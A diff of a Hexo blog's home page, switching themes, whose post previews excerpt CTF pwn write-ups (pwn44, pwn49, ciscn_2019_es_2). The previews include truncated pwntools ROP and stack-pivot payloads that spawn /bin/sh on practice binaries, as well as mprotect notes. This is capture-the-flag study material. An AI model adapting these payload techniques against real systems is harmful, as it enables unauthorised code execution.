@@ -1,330 +1,617 @@
-<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="application-name" content="Hexo"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="website"><meta property="og:title" content="Hexo"><meta property="og:url" content="http://example.com/page/2/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description"><meta property="og:locale" content="en"><meta property="og:image" content="http://example.com/img/avatar.jpg"><meta property="article:author" content="John Doe"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/img/avatar.jpg"><meta name="description"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/page/2/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
-  linkPageTop: undefined,
-  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
-  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
-  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
-  LA51: undefined,
-  greetingBox: undefined,
-  twikooEnvId: '',
-  commentBarrageConfig:undefined,
-  music_page_default: "nav_music",
-  root: '/',
-  preloader: {"source":3},
-  friends_vue_info: undefined,
-  navMusic: true,
-  mainTone: undefined,
-  authorStatus: undefined,
-  algolia: undefined,
-  localSearch: undefined,
-  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
-  copy: {
-    success: 'Copy successfully',
-    error: 'Copy error',
-    noSupport: 'The browser does not support'
-  },
-  relativeDate: {
-    homepage: false,
-    simplehomepage: true,
-    post: false
-  },
-  runtime: 'days',
-  date_suffix: {
-    just: 'Just',
-    min: 'minutes ago',
-    hour: 'hours ago',
-    day: 'days ago',
-    month: 'months ago'
-  },
-  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"Author: John Doe","link":"Link: ","source":"Source: Hexo","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
-  lightbox: 'fancybox',
-  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
-  source: {
-    justifiedGallery: {
-      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
-      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
-    }
-  },
-  isPhotoFigcaption: false,
-  islazyload: true,
-  isAnchor: false,
-  shortcutKey: undefined,
-  autoDarkmode: true
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  configTitle: 'Hexo',
-  title: 'Hexo',
-  postAI: '',
-  pageFillDescription: '',
-  isPost: false,
-  isHome: true,
-  isHighlightShrink: false,
-  isToc: false,
-  postUpdate: '2025-08-18 19:42:35',
-  postMainColor: '',
-}</script><noscript><style type="text/css">
-  #nav {
-    opacity: 1
-  }
-  .justified-gallery img {
-    opacity: 1
-  }
-
-  #recent-posts time,
-  #post-meta time {
-    display: inline !important
-  }
-</style></noscript><script>(win=>{
-      win.saveToLocal = {
-        set: (key, value, ttl) => {
-          if (ttl === 0) return
-          const now = Date.now()
-          const expiry = now + ttl * 86400000
-          const item = {
-            value,
-            expiry
-          }
-          localStorage.setItem(key, JSON.stringify(item))
-        },
-      
-        get: key => {
-          const itemStr = localStorage.getItem(key)
-      
-          if (!itemStr) {
-            return undefined
-          }
-          const item = JSON.parse(itemStr)
-          const now = Date.now()
-      
-          if (now > item.expiry) {
-            localStorage.removeItem(key)
-            return undefined
-          }
-          return item.value
-        }
-      }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Keep Team">
     
-      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        script.onerror = reject
-        script.onload = script.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          script.onload = script.onreadystatechange = null
-          resolve()
-        }
-
-        Object.keys(attr).forEach(key => {
-          script.setAttribute(key, attr[key])
-        })
-
-        document.head.appendChild(script)
-      })
-    
-      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onerror = reject
-        link.onload = link.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          link.onload = link.onreadystatechange = null
-          resolve()
-        }
-        document.head.appendChild(link)
-      })
-    
-      win.activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
-        }
-      }
-      win.activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
-        }
-      }
-      const t = saveToLocal.get('theme')
-    
-          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
-          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
-          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
-          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
-
-          if (t === undefined) {
-            if (isLightMode) activateLightMode()
-            else if (isDarkMode) activateDarkMode()
-            else if (isNotSpecified || hasNoSupport) {
-              const now = new Date()
-              const hour = now.getHours()
-              const isNight = hour <= 6 || hour >= 18
-              isNight ? activateDarkMode() : activateLightMode()
-            }
-            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
-              if (saveToLocal.get('theme') === undefined) {
-                e.matches ? activateDarkMode() : activateLightMode()
-              }
-            })
-          } else if (t === 'light') activateLightMode()
-          else activateDarkMode()
+    <title>
         
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
+        Keep Theme
+    </title>
     
-      const detectApple = () => {
-        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-          document.documentElement.classList.add('apple')
-        }
-      }
-      detectApple()
-    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
-  endLoading: () => {
-    document.getElementById('loading-box').classList.add("loaded");
-  },
-  initLoading: () => {
-    document.getElementById('loading-box').classList.remove("loaded")
-  }
-}
-window.addEventListener('load',()=> { preloader.endLoading() })
-setTimeout(function(){preloader.endLoading();},10000)
+<link rel="stylesheet" href="/css/style.css">
 
-if (true) {
-  document.addEventListener('pjax:send', () => { preloader.initLoading() })
-  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
-}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="page" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Hexo</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/BUU/" style="font-size: 1.05rem;">BUU<sup>10</sup></a><a href="/tags/Canary/" style="font-size: 1.05rem;">Canary<sup>1</sup></a><a href="/tags/NSS/" style="font-size: 1.05rem;">NSS<sup>2</sup></a><a href="/tags/PWN/" style="font-size: 1.05rem;">PWN<sup>12</sup></a><a href="/tags/RC4/" style="font-size: 1.05rem;">RC4<sup>1</sup></a><a href="/tags/RC4%E5%8F%98%E5%BC%8F/" style="font-size: 1.05rem;">RC4变式<sup>1</sup></a><a href="/tags/RE/" style="font-size: 1.05rem;">RE<sup>3</sup></a><a href="/tags/SMC/" style="font-size: 1.05rem;">SMC<sup>1</sup></a><a href="/tags/TEA/" style="font-size: 1.05rem;">TEA<sup>1</sup></a><a href="/tags/WP/" style="font-size: 1.05rem;">WP<sup>4</sup></a><a href="/tags/csu/" style="font-size: 1.05rem;">csu<sup>1</sup></a><a href="/tags/ctfshow/" style="font-size: 1.05rem;">ctfshow<sup>2</sup></a><a href="/tags/gdb/" style="font-size: 1.05rem;">gdb<sup>2</sup></a><a href="/tags/mprotect/" style="font-size: 1.05rem;">mprotect<sup>1</sup></a><a href="/tags/one-gadget/" style="font-size: 1.05rem;">one_gadget<sup>1</sup></a><a href="/tags/orw/" style="font-size: 1.05rem;">orw<sup>1</sup></a><a href="/tags/pwn-study/" style="font-size: 1.05rem;">pwn_study<sup>5</sup></a><a href="/tags/ret2libc2-x64/" style="font-size: 1.05rem;">ret2libc2_x64<sup>1</sup></a><a href="/tags/ret2libc-printf/" style="font-size: 1.05rem;">ret2libc_printf<sup>1</sup></a><a href="/tags/%E5%8A%A8%E8%B0%83/" style="font-size: 1.05rem;">动调<sup>1</sup></a><a href="/tags/%E5%B0%8F%E7%AB%AF%E5%BA%8F/" style="font-size: 1.05rem;">小端序<sup>1</sup></a><a href="/tags/%E6%8E%A8%E6%B5%8B/" style="font-size: 1.05rem;">推测<sup>1</sup></a><a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 1.05rem;">栈溢出<sup>1</sup></a><a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" style="font-size: 1.05rem;">栈迁移<sup>2</sup></a><a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 1.05rem;">格式化字符串<sup>2</sup></a><a href="/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/" style="font-size: 1.05rem;">花指令<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/08/"><span class="card-archive-list-date">August 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">July 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">19</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">March 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav></header><main id="blog-container"><div class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div id="categoryBar"><div class="category-bar" id="category-bar"><div id="catalog-bar"><div id="catalog-list"><div class="catalog-list-item" id="首页"><a href="/">首页</a></div></div><div class="category-bar-next" id="category-bar-next" onclick="anzhiyu.scrollCategoryBarToRight()"><i class="anzhiyufont anzhiyu-icon-angle-double-right"></i></div><a class="catalog-more" href="/categories/">更多</a></div></div></div><div class="recent-post-item lastestpost-item" onclick="pjax.loadUrl('/2025/07/26/pwn44/')"><div class="recent-post-info no-cover"><div class="recent-post-info-top"><div class="recent-post-info-top-tips"><a class="unvisited-post" href="/2025/07/26/pwn44/" title="pwn44">未读</a></div><a class="article-title" href="/2025/07/26/pwn44/" title="pwn44">pwn44</a></div><div class="article-meta-wrap"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days" style="font-size: 15px; display:none"></i><span class="article-meta-label">Created</span><time datetime="2025-07-26T06:26:45.000Z" title="Created 2025-07-26 14:26:45" time="2025-07-26 14:26:45">2025-07-26</time><time class="time_hidden" datetime="2025-07-26T07:18:11.765Z" title="Updated 2025-07-26 15:18:11" time="2025-07-26 15:18:11">2025-07-26</time></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/PWN/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>PWN</span></a><a class="article-meta__tags" href="/tags/ctfshow/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>ctfshow</span></a><a class="article-meta__tags" href="/tags/ret2libc2-x64/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>ret2libc2_x64</span></a></span></div><div class="content">
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Keep Theme","author":"Keep Team","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":false,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box is-home">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Keep Theme
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    <div class="home-content-container fade-in-down-animation">
+    
+    <ul class="home-post-list border-box">
+        
+            <li class="home-post-item">
+
+                
+
+                <div class="home-post-item-bottom border-box">
+                    
+                    <h3 class="home-post-title border-box">
+                        <a href="/2025/07/26/pwn49/">
+                            pwn49
+                        </a>
+                    </h3>
+
+                    <div class="home-post-content keep-markdown-body">
+                        
+                            
+
+看出是静态编译，考虑用mprotect来修改它的权限
+
+ctrl+s查看bss段，找要修改的范围
+
+因为mprotect的地址选择的限制条件
+我们把页面边界定为0x80DA000
+接着就可以构造payload了
+先调用mprotect函数修改权限...
+                        
+                    </div>
+
+                    
+
+<div class="post-meta-info-container border-box home">
+    <div class="post-meta-info border-box">
+        
+            <span class="meta-info-item border-box">
+                <i class="icon fa-solid fa-history"></i>&nbsp;<span class="home-post-history"
+                                                                                data-updated="Mon Aug 04 2025 12:44:35 GMT+0800"
+                >2025-08-04 12:44:35</span>
+            </span>
+        
+
+        
+
+        
+
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+        <a class="home-read-more" href="/2025/07/26/pwn49/">Read more&nbsp;<i class="icon fas fa-angle-right"></i></a>
+    
+</div>
+
+                </div>
+            </li>
+        
+            <li class="home-post-item">
+
+                
+
+                <div class="home-post-item-bottom border-box">
+                    
+                    <h3 class="home-post-title border-box">
+                        <a href="/2025/07/26/pwn44/">
+                            pwn44
+                        </a>
+                    </h3>
+
+                    <div class="home-post-content keep-markdown-body">
+                        
+                            
 
 
 有system函数，无字符段，可以通过泄露libc基址
 但是也可以通过调用gets函数写入
-脚本1234567891011121314151617from pwn import *p=process(&quot;./pwn44&quot;)#gdb.attach(p,&quot;b*0x0000000000400737&quot;)#p=remote(&quot;pwn.challenge.ctf.show&quot;,28121)elf=ELF(&quot;./pwn44&quot;)system=0x00400520rdi=0x4007f3gets_plt=elf.plt[&quot;gets&quot;]bss=0x0602080ret=0X4004fepayload=b&#x27;a&#x27;*(0xa+8)payload+=p64(rdi)+p64(bss)+p64(gets_plt)payload+=p64(rdi)+p64(bss)+p64(system)p.sendline(payload)p.sendline(b&quot;/bin/sh&quot;)p.re ...</div></div></div><div class="recent-post-item" onclick="pjax.loadUrl('/2025/07/24/ciscn-2019-es-2/')"><div class="recent-post-info no-cover"><div class="recent-post-info-top"><div class="recent-post-info-top-tips"><a class="unvisited-post" href="/2025/07/24/ciscn-2019-es-2/" title="ciscn_2019_es_2">未读</a></div><a class="article-title" href="/2025/07/24/ciscn-2019-es-2/" title="ciscn_2019_es_2">ciscn_2019_es_2</a></div><div class="article-meta-wrap"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days" style="font-size: 15px; display:none"></i><span class="article-meta-label">Created</span><time datetime="2025-07-24T09:05:12.000Z" title="Created 2025-07-24 17:05:12" time="2025-07-24 17:05:12">2025-07-24</time><time class="time_hidden" datetime="2025-07-29T01:46:04.949Z" title="Updated 2025-07-29 09:46:04" time="2025-07-29 09:46:04">2025-07-29</time></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/PWN/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>PWN</span></a><a class="article-meta__tags" href="/tags/BUU/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>BUU</span></a><a class="article-meta__tags" href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>栈迁移</span></a><a class="article-meta__tags" href="/tags/gdb/" event.cancelbubble onclick="window.event.cancelBubble=true;"><span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>gdb</span></a></span></div><div class="content">
+脚本1234567891011121314151617from pwn import *p=process(&quot;./pwn44&quot;)#g...
+                        
+                    </div>
+
+                    
+
+<div class="post-meta-info-container border-box home">
+    <div class="post-meta-info border-box">
+        
+            <span class="meta-info-item border-box">
+                <i class="icon fa-solid fa-history"></i>&nbsp;<span class="home-post-history"
+                                                                                data-updated="Sat Jul 26 2025 15:18:11 GMT+0800"
+                >2025-07-26 15:18:11</span>
+            </span>
+        
+
+        
+
+        
+
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+        <a class="home-read-more" href="/2025/07/26/pwn44/">Read more&nbsp;<i class="icon fas fa-angle-right"></i></a>
+    
+</div>
+
+                </div>
+            </li>
+        
+            <li class="home-post-item">
+
+                
+
+                <div class="home-post-item-bottom border-box">
+                    
+                    <h3 class="home-post-title border-box">
+                        <a href="/2025/07/24/ciscn-2019-es-2/">
+                            ciscn_2019_es_2
+                        </a>
+                    </h3>
+
+                    <div class="home-post-content keep-markdown-body">
+                        
+                            
 
 很明显的栈溢出漏洞，但是可操作空间太小，只能覆盖到返回地址，所以要用栈迁移
 
 有system函数，但是需要自己传参，小问题
 分析题目可知，有两次输入，第一次输入可以用来泄露ebp的地址
-1payload=b&quot;a&quot;*0x27+b&quot;b&quot;
+1payload=b&quot;a&quot;*0x27+b...
+                        
+                    </div>
 
+                    
 
+<div class="post-meta-info-container border-box home">
+    <div class="post-meta-info border-box">
+        
+            <span class="meta-info-item border-box">
+                <i class="icon fa-solid fa-history"></i>&nbsp;<span class="home-post-history"
+                                                                                data-updated="Tue Jul 29 2025 09:46:04 GMT+0800"
+                >2025-07-29 09:46:04</span>
+            </span>
+        
 
+        
 
+        
 
-第二次要根据这个泄露出来的地址去构造我我们的后门函数
-先查看ebp距离s的实际距离（gdb动态调试查看）
+        
 
-相距0xffffcf18 - 0xffffcee0 &#x3D; 0x38
-接着构造我们的后门函数
+        
+        
+        
+        
+    </div>
 
-所以
-123payload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;payload=payload.ljust(0x28,b&quot;\x00&quot;)payload+=p32(s)+p32(leave)
+    
+        <a class="home-read-more" href="/2025/07/24/ciscn-2019-es-2/">Read more&nbsp;<i class="icon fas fa-angle-right"></i></a>
+    
+</div>
 
